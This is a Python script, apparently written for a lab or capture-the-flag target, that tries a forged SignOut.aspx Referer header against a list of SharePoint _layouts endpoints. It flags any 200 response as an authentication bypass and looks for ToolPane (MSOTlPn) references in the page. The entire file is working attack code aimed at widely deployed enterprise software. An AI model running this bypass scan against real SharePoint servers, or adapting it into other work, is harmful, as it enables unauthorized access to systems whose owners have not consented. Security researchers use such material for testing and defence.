#!/usr/bin/env python3
"""
Test alternative _layouts endpoints for authentication bypass
Purpose: Find other endpoints that accept signout referer bypass
"""
import requests

requests.packages.urllib3.disable_warnings()

def test_endpoint(target, endpoint, description):
    """Test endpoint with signout referer"""
    url = f"{target}{endpoint}"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows; U; Windows CE; Mobile; like Android; ko-kr) AppleWebKit/533.3",
        "Referer": "/_layouts/SignOut.aspx",
    }
    
    print(f"\n[*] Testing: {description}")
    print(f"    Endpoint: {endpoint}")
    
    try:
        response = requests.get(url, headers=headers, verify=False, timeout=30, allow_redirects=False)
        print(f"    Status: {response.status_code}")
        
        if response.status_code == 200:
            print(f"    [!!!] SUCCESS - Auth bypassed!")
            print(f"    Response length: {len(response.text)}")
            # Check if it processes MSOTlPn_DWP
            if "MSOTlPn" in response.text:
                print(f"    [!!!] CRITICAL - Contains MSOTlPn references!")
            return True
        elif response.status_code == 302:
            print(f"    Redirect to: {response.headers.get('Location', 'N/A')}")
        elif response.status_code == 401:
            print(f"    Blocked (401)")
        else:
            print(f"    Other status: {response.status_code}")
    except Exception as e:
        print(f"    Error: {str(e)}")
    
    return False

if __name__ == "__main__":
    target = "http://10.10.10.166"
    
    # Test endpoints that might handle WebPart/ToolPane operations
    endpoints = [
        ("/_layouts/15/WebPartEditingSurface.aspx", "WebPartEditingSurface"),
        ("/_layouts/WebPartEditingSurface.aspx", "WebPartEditingSurface (no 15)"),
        ("/_layouts/15/WpAdder.aspx", "WpAdder"),
        ("/_layouts/15/WebPartGallery.aspx", "WebPartGallery"),
        ("/_layouts/15/WebPartAdder.aspx", "WebPartAdder"),
        ("/_layouts/15/EditPane.aspx", "EditPane"),
        ("/_layouts/15/ToolPaneView.aspx", "ToolPaneView"),
        ("/_layouts/15/WebPartPage.aspx", "WebPartPage"),
        # Test similar start/signout pattern
        ("/_layouts/start.aspx", "start.aspx (no 15)"),
        ("/_layouts/SignIn.aspx", "SignIn"),
        ("/_layouts/15/SignIn.aspx", "SignIn (15)"),
        ("/_layouts/Authenticate.aspx", "Authenticate (no 15)"),
    ]
    
    for endpoint, desc in endpoints:
        test_endpoint(target, endpoint, desc)

